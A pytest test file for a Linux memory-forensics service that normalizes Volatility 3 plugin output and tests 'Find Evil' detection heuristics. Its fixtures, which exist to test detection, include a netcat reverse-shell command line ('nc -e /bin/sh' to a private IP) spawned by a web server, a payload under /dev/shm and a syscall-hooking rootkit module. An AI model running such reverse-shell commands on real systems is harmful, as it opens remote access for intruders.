"""Linux memory plugins beyond processes, network and bash: their normalizers, and Kairon's
Linux Find Evil checks (app.services.memory.kairon_linux_findevil). Rows are shaped like
Volatility 3's JSON output for each plugin."""
from __future__ import annotations

from app.services.memory.artifact_normalizers import normalize_linux_lsmod, normalize_linux_lsof, normalize_memprocfs_findevil
from app.services.memory.capability_registry import MemoryCapability, resolved_plugins_for_capability
from app.services.memory.execution import ARTIFACT_PLUGIN_NORMALIZER, PROCESS_PLUGINS
from app.services.memory.kairon_linux_findevil import linux_findevil_indicators
from app.services.memory.normalizers import normalize_linux_psaux, normalize_linux_psscan
from app.services.memory.platform import PlatformFamily
from app.services.memory.volatility_runner import VOLATILITY_PLUGIN_CLASSES, probe_volatility_plugin
from app.core.config import get_settings

COMMON = {"case_id": "case", "evidence_id": "ev", "scan_run_id": "run", "plugin_run_id": "plugin-run"}


def _task(pid, comm, ppid, *, uid=0, euid=None, tid=None):
    return {"PID": pid, "TID": tid if tid is not None else pid, "PPID": ppid, "COMM": comm, "UID": uid, "EUID": uid if euid is None else euid, "__children": []}


def _types(indicators):
    return sorted({row["Type"] for row in indicators})


def test_every_linux_plugin_is_runnable_end_to_end():
    allowed = set(get_settings().allowed_memory_plugins)
    for capability in MemoryCapability:
        for plugin in resolved_plugins_for_capability(PlatformFamily.LINUX, capability):
            assert plugin in allowed, plugin
            assert plugin in PROCESS_PLUGINS or plugin in ARTIFACT_PLUGIN_NORMALIZER, plugin
            assert plugin.startswith("kairon.") or plugin in VOLATILITY_PLUGIN_CLASSES, plugin


def test_kairon_checks_are_available_wherever_volatility_is(monkeypatch):
    import importlib.util

    monkeypatch.setattr(importlib.util, "find_spec", lambda name: object() if name == "volatility3" else None)
    assert probe_volatility_plugin("kairon.linux_findevil") is True


def test_psscan_lists_processes_not_threads_and_marks_exited_ones():
    rows = [
        {"PID": 10, "TID": 10, "PPID": 1, "COMM": "sshd", "EXIT_STATE": "TASK_RUNNING", "OFFSET (P)": 4096},
        {"PID": 10, "TID": 11, "PPID": 1, "COMM": "sshd", "EXIT_STATE": "TASK_RUNNING", "OFFSET (P)": 8192},
        {"PID": 12, "TID": 12, "PPID": 10, "COMM": "cron", "EXIT_STATE": "EXIT_ZOMBIE", "OFFSET (P)": 12288},
    ]
    result = normalize_linux_psscan(rows)
    assert [item["process"]["pid"] for item in result["processes"]] == [10, 12]
    exited = result["processes"][1]
    assert exited["process"]["exit_state"] == "EXIT_ZOMBIE"
    assert exited["state"]["terminated_candidate"] is True
    assert result["processes"][0]["visibility"]["psscan"] is True


def test_psaux_brings_the_full_command_line():
    result = normalize_linux_psaux([{"PID": 2169, "PPID": 2042, "COMM": "nc", "ARGS": "nc 10.0.0.1 8888"}])
    assert result["processes"][0]["process"]["command_line"] == "nc 10.0.0.1 8888"
    assert result["processes"][0]["process"]["name"] == "nc"


def test_open_files_become_handles_once_per_process():
    rows = [
        {"PID": 7, "TID": 7, "Process": "sh", "FD": 0, "Type": "SOCK", "Path": "socket:[5175]", "Mode": "srwxrwxrwx", "Inode": 5175},
        {"PID": 7, "TID": 8, "Process": "sh", "FD": 0, "Type": "SOCK", "Path": "socket:[5175]", "Mode": "srwxrwxrwx", "Inode": 5175},
        {"PID": 7, "TID": 7, "Process": "sh", "FD": 3, "Type": "REG", "Path": "/etc/passwd", "Size": 1200},
    ]
    result = normalize_linux_lsof(rows, **COMMON)
    assert [(doc["handle_value"], doc["object_type"], doc["object_name"]) for doc in result["items"]] == [(0, "SOCK", "socket:[5175]"), (3, "REG", "/etc/passwd")]
    assert result["items"][0]["document_type"] == "memory_handle"
    assert result["dropped_count"] == 1


def test_lsmod_modules_become_kernel_modules():
    result = normalize_linux_lsmod([{"Module Name": "ipv6", "Offset": 3500438720, "Code Size": 235396, "Load Arguments": "", "Taints": ""}], **COMMON)
    doc = result["items"][0]
    assert (doc["module_name"], doc["base_address"], doc["size"], doc["document_type"]) == ("ipv6", 3500438720, 235396, "memory_kernel_module")
    high = normalize_linux_lsmod([{"Module Name": "nf_tables", "Offset": 0xFFFFFFFFC0A00000, "Code Size": 4096}], **COMMON)["items"][0]
    assert (high["base_address"], high["base_address_hex"]) == (None, "0xffffffffc0a00000")


def test_a_shell_on_a_socket_started_by_a_web_server_and_its_commands():
    outputs = {
        "linux.pslist": [_task(1, "init", 0), _task(900, "apache2", 1, uid=33), _task(901, "sh", 900, uid=33), _task(902, "nc", 901, uid=33)],
        "linux.psaux": [
            {"PID": 901, "PPID": 900, "COMM": "sh", "ARGS": "sh -i"},
            {"PID": 902, "PPID": 901, "COMM": "nc", "ARGS": "nc -e /bin/sh 10.0.0.1 4444"},
        ],
        "linux.lsof": [{"PID": 901, "TID": 901, "Process": "sh", "FD": fd, "Type": "SOCK"} for fd in (0, 1, 2)],
    }
    indicators, notes = linux_findevil_indicators(outputs)
    assert notes == []
    assert {"SHELL_SOCKET", "PROC_SPAWN", "CMDLINE"} <= set(_types(indicators))
    shell = next(row for row in indicators if row["Type"] == "SHELL_SOCKET")
    assert shell["PID"] == 901 and "FD 0, 1, 2" in shell["Description"]
    netcat = next(row for row in indicators if row["Type"] == "CMDLINE" and row["PID"] == 902)
    assert netcat["Priority"] == "high"


def test_quiet_processes_raise_nothing():
    outputs = {
        "linux.pslist": [_task(1, "systemd", 0), _task(2, "kthreadd", 0), _task(3, "kworker/0:1", 2), _task(400, "sshd", 1), _task(401, "bash", 400, uid=1000)],
        "linux.psaux": [{"PID": 3, "PPID": 2, "COMM": "kworker/0:1", "ARGS": "[kworker/0:1]"}, {"PID": 401, "PPID": 400, "COMM": "bash", "ARGS": "-bash"}],
        "linux.psscan": [{"PID": pid, "TID": pid, "PPID": 0, "COMM": "x", "EXIT_STATE": "TASK_RUNNING"} for pid in (1, 2, 3, 400, 401)],
        "linux.lsof": [{"PID": 401, "TID": 401, "Process": "bash", "FD": 0, "Type": "CHR", "Path": "/dev/pts/0"}],
    }
    assert linux_findevil_indicators(outputs) == ([], [])


def test_hidden_masquerading_and_escalated_processes():
    outputs = {
        "linux.pslist": [_task(1, "init", 0), _task(2, "kthreadd", 0), _task(500, "kworker", 1, uid=1000), _task(600, "bash", 599, uid=1000), _task(601, "sh", 600, uid=1000, euid=0)],
        "linux.psaux": [{"PID": 500, "PPID": 1, "COMM": "kworker", "ARGS": "[kworker/1:2]"}, {"PID": 601, "PPID": 600, "COMM": "sh", "ARGS": "/dev/shm/.x/run"}],
        "linux.psscan": [
            {"PID": 700, "TID": 700, "PPID": 1, "COMM": "evil", "EXIT_STATE": "TASK_RUNNING", "OFFSET (P)": 4096},
            {"PID": 701, "TID": 701, "PPID": 1, "COMM": "cron", "EXIT_STATE": "EXIT_ZOMBIE"},
            {"PID": 600, "TID": 600, "PPID": 599, "COMM": "bash", "EXIT_STATE": "TASK_RUNNING"},
        ],
    }
    indicators, _ = linux_findevil_indicators(outputs)
    by_type = {row["Type"]: row for row in indicators}
    assert by_type["PROC_NOLINK"]["PID"] == 700
    assert by_type["PROC_TERMINATED"]["PID"] == 701
    assert by_type["PROC_KTHREAD_MASQ"]["PID"] == 500
    assert by_type["PROC_ROOT"]["PID"] == 601
    assert by_type["PROC_LOCATION"]["Priority"] == "high"  # /dev/shm


def _syscalls(resolved, unknown, *, unknown_address=0xF8001000):
    rows = [{"Index": i, "Table Name": "64bit", "Handler Address": 0xFFFFFFFF81000000 + i, "Handler Symbol": f"sys_{i}"} for i in range(resolved)]
    rows += [{"Index": resolved + i, "Table Name": "64bit", "Handler Address": unknown_address, "Handler Symbol": "UNKNOWN"} for i in range(unknown)]
    return rows


def test_a_syscall_hooked_by_a_module_is_named():
    outputs = {
        "linux.lsmod": [{"Module Name": "diamorphine", "Offset": 0xF8000000, "Code Size": 0x4000}],
        "linux.malware.check_syscall": _syscalls(300, 1),
        "linux.malware.hidden_modules": [{"Module Name": "diamorphine", "Address": 0xF8000000}],
        "linux.malware.check_afinfo": [{"Symbol Name": "tcp4_seq_afinfo", "Member": "show", "Handler Address": 0xF8002000}],
        "linux.malware.check_idt": [{"Index": 128, "Address": 0xFFFFFFFF81000000, "Module": "kernel", "Symbol": "entry_INT80"}],
    }
    indicators, notes = linux_findevil_indicators(outputs)
    assert notes == []
    hook = next(row for row in indicators if row["Type"] == "SYSCALL_HOOK")
    assert "kernel module diamorphine" in hook["Description"]
    assert {"MODULE_HIDDEN", "AFINFO_HOOK"} <= set(_types(indicators))
    assert "IDT_HOOK" not in _types(indicators)  # the kernel's own handler


def test_hook_checks_are_skipped_when_symbols_are_from_another_build():
    # Most handlers without a symbol: the symbol addresses do not belong to this exact build.
    outputs = {"linux.malware.check_syscall": _syscalls(26, 302), "linux.malware.check_afinfo": [{"Symbol Name": "tcp4_seq_afinfo", "Member": "read", "Handler Address": 0x504354}]}
    indicators, notes = linux_findevil_indicators(outputs)
    assert indicators == []
    assert "kernel hook checks skipped" in notes[0]


def test_an_elf_in_anonymous_memory_is_high_and_jit_memory_is_low():
    outputs = {"linux.malware.malfind": [
        {"PID": 5, "Process": "sshd", "Start": 0x7F0000000000, "Protection": "rwx", "Hexdump": "7f 45 4c 46 02 01 01 00"},
        {"PID": 6, "Process": "java", "Start": 0x7F1000000000, "Protection": "rwx", "Hexdump": "48 89 e5"},
    ]}
    indicators, _ = linux_findevil_indicators(outputs)
    assert [(row["Type"], row.get("Priority")) for row in indicators] == [("ELF_INJECT", None), ("PRIVATE_RWX", "low")]


def test_executable_memory_is_one_lead_per_process_and_browser_children_are_jit():
    outputs = {
        "linux.psaux": [{"PID": 7, "PPID": 1, "COMM": "Isolated Web Co", "ARGS": "/usr/lib/firefox/firefox -contentproc -childID 3"}, {"PID": 8, "PPID": 1, "COMM": "networkd-dispat", "ARGS": "/usr/bin/python3 /usr/bin/networkd-dispatcher"}],
        "linux.malware.malfind": [{"PID": 7, "Process": "Isolated Web Co", "Start": 0x1000 * i, "Protection": "rwx", "Hexdump": "00"} for i in range(1, 6)]
        + [{"PID": 8, "Process": "networkd-dispat", "Start": 0x9000, "Protection": "rwx", "Hexdump": "00"}, {"PID": 9, "Process": "sshd", "Start": 0xA000, "Protection": "r-x", "Hexdump": "00"}],
    }
    indicators, _ = linux_findevil_indicators(outputs)
    by_pid = {row["PID"]: row for row in indicators}
    assert len(indicators) == 3
    assert by_pid[7]["Priority"] == "low" and "5 regions" in by_pid[7]["Description"]
    assert by_pid[8]["Priority"] == "low"  # Python's libffi closures
    assert by_pid[9]["Priority"] == "medium"


def test_a_shell_writing_to_the_journal_is_not_a_reverse_shell():
    outputs = {
        "linux.pslist": [_task(1829, "sh", 1), _task(1900, "sh", 1)],
        "linux.lsof": [{"PID": 1829, "TID": 1829, "FD": fd, "Type": "SOCK"} for fd in (1, 2)]
        + [{"PID": 1900, "TID": 1900, "FD": fd, "Type": "SOCK"} for fd in (0, 1, 2)],
        "linux.sockstat": [{"PID": 1829, "FD": fd, "Family": "AF_UNIX"} for fd in (1, 2)] + [{"PID": 1900, "FD": fd, "Family": "AF_UNIX"} for fd in (0, 1, 2)],
    }
    indicators, _ = linux_findevil_indicators(outputs)
    assert indicators == []
    outputs["linux.sockstat"][-3:] = [{"PID": 1900, "FD": fd, "Family": "AF_INET"} for fd in (0, 1, 2)]
    assert _types(linux_findevil_indicators(outputs)[0]) == ["SHELL_SOCKET"]


def test_linux_indicators_are_normalized_as_linux_findevil():
    indicators, _ = linux_findevil_indicators({"linux.lsof": [{"PID": 9, "Process": "bash", "FD": 0, "Type": "SOCK"}], "linux.pslist": [_task(9, "bash", 1)]})
    result = normalize_memprocfs_findevil(indicators, source_plugin="kairon.linux_findevil", platform="linux", **COMMON)
    doc = result["items"][0]
    assert (doc["platform"], doc["indicator_type"], doc["review_priority"], doc["indicator_category"]) == ("linux", "SHELL_SOCKET", "high", "process")


def test_an_unreadable_task_list_does_not_make_every_process_hidden():
    outputs = {"linux.pslist": [], "linux.psscan": [{"PID": pid, "TID": pid, "PPID": 1, "COMM": "x", "EXIT_STATE": "TASK_RUNNING"} for pid in range(1, 50)]}
    indicators, notes = linux_findevil_indicators(outputs)
    assert indicators == []
    assert "task list returned no processes" in notes[0]


# --- Files and "Retrieve file" on Linux (linux.pagecache) ---

def test_pagecache_files_become_file_objects_with_the_inode_as_offset():
    from app.services.memory.artifact_normalizers import normalize_linux_pagecache_files

    rows = [{"FilePath": "/tmp/.x/payload", "FileType": "REG", "InodeAddr": 0x9EE0C1FC6F68, "InodeNum": 42, "InodeSize": 2048, "CachedPages": 1, "MountPoint": "/tmp", "ModificationTime": "2024-07-03T19:28:17+00:00"}, {"FilePath": None}]
    result = normalize_linux_pagecache_files(rows, **COMMON)
    doc = result["items"][0]
    assert (doc["name"], doc["offset"], doc["platform"], doc["file_type"], doc["cached_pages"], doc["document_type"]) == ("/tmp/.x/payload", "0x9ee0c1fc6f68", "linux", "REG", 1, "memory_file_object")
    assert result["dropped_count"] == 1


def test_linux_paths_match_exactly_then_by_name_and_only_regular_files():
    from app.services.memory.file_extraction import _match_linux_rows

    rows = [{"FilePath": "/etc/passwd", "FileType": "REG"}, {"FilePath": "/var/backups/passwd", "FileType": "REG"}, {"FilePath": "/etc", "FileType": "DIR"}]
    assert [row["FilePath"] for row in _match_linux_rows(rows, "/etc/passwd")] == ["/etc/passwd"]
    assert [row["FilePath"] for row in _match_linux_rows(rows, "passwd")] == ["/etc/passwd", "/var/backups/passwd"]
    assert _match_linux_rows(rows, "/etc/PASSWD") == []  # case-sensitive, and no name match either
    assert _match_linux_rows(rows, "/etc") == []


def _fake_volatility(monkeypatch, tmp_path, *, dump_fails=False, files_rows=None):
    import json as _json
    from types import SimpleNamespace

    from app.services.memory import file_extraction
    from app.services.memory.volatility_runner import VolatilityRunnerError

    calls = []
    rows = files_rows if files_rows is not None else [{"FilePath": "/tmp/payload", "FileType": "REG", "InodeAddr": 0x1000, "InodeSize": 6, "CachedPages": 1}]

    def run_plugin(plugin, image, work_dir, *, timeout_seconds, extra_args=None, **_):
        calls.append((plugin, extra_args))
        if plugin == "linux.pagecache.Files":
            wanted = extra_args[1] if extra_args else None
            found = [row for row in rows if wanted is None or row["FilePath"] == wanted]
            return SimpleNamespace(stdout=_json.dumps(found).encode())
        if dump_fails:
            raise VolatilityRunnerError("PLUGIN_FAILED", "unexpected situation")
        (work_dir / f"inode_0x{int(extra_args[1]):x}.dmp").write_bytes(b"secret")
        return SimpleNamespace(stdout=b"[]")

    monkeypatch.setattr(file_extraction, "run_plugin", run_plugin)
    monkeypatch.setattr(file_extraction, "relative_to_data_dir", lambda path: str(path))
    extraction = SimpleNamespace(requested_path="/tmp/payload", evidence_id="ev", filescan_matches=None)
    db = SimpleNamespace(commit=lambda: None)
    return file_extraction, extraction, db, calls


def test_retrieve_file_on_linux_dumps_the_cached_pages(monkeypatch, tmp_path):
    file_extraction, extraction, db, calls = _fake_volatility(monkeypatch, tmp_path)
    results = file_extraction._extract_linux(db, extraction, tmp_path / "image", tmp_path)
    assert [call[0] for call in calls] == ["linux.pagecache.Files", "linux.pagecache.InodePages"]
    assert calls[1][1] == ["--inode", str(0x1000), "--dump"]
    assert results[0]["original_filename"] == "/tmp/payload" and results[0]["size_bytes"] == 6
    assert extraction.filescan_matches == [{"offset": "0x1000", "name": "/tmp/payload"}]


def test_retrieve_file_on_linux_by_name_lists_every_cached_file(monkeypatch, tmp_path):
    file_extraction, extraction, db, calls = _fake_volatility(monkeypatch, tmp_path)
    extraction.requested_path = "payload"
    results = file_extraction._extract_linux(db, extraction, tmp_path / "image", tmp_path)
    assert calls[0] == ("linux.pagecache.Files", None) and len(results) == 1


def test_a_failed_dump_with_an_old_dwarf2json_isf_says_how_to_fix_it(monkeypatch, tmp_path):
    import pytest as _pytest

    from app.services.memory.volatility_runner import VolatilityRunnerError

    file_extraction, extraction, db, _ = _fake_volatility(monkeypatch, tmp_path, dump_fails=True)
    monkeypatch.setattr(file_extraction, "_isf_hint", lambda db, evidence_id: " regenerate the ISF with dwarf2json 0.8 or later")
    with _pytest.raises(VolatilityRunnerError) as error:
        file_extraction._extract_linux(db, extraction, tmp_path / "image", tmp_path)
    assert "dwarf2json 0.8" in error.value.message


def test_isfs_from_dwarf2json_before_0_8_are_recognised(tmp_path):
    import json as _json

    from app.services.memory.linux_symbols import isf_producer, predates_anonymous_member_names

    path = tmp_path / "isf.json"
    path.write_text(_json.dumps({"metadata": {"producer": {"name": "dwarf2json", "version": "0.7.0"}}, "symbols": {}}))
    assert isf_producer(path) == ("dwarf2json", "0.7.0")
    assert predates_anonymous_member_names(("dwarf2json", "0.7.0"))
    assert not predates_anonymous_member_names(("dwarf2json", "0.9.0"))
    assert not predates_anonymous_member_names(("kairon-vol2-profile", "3"))
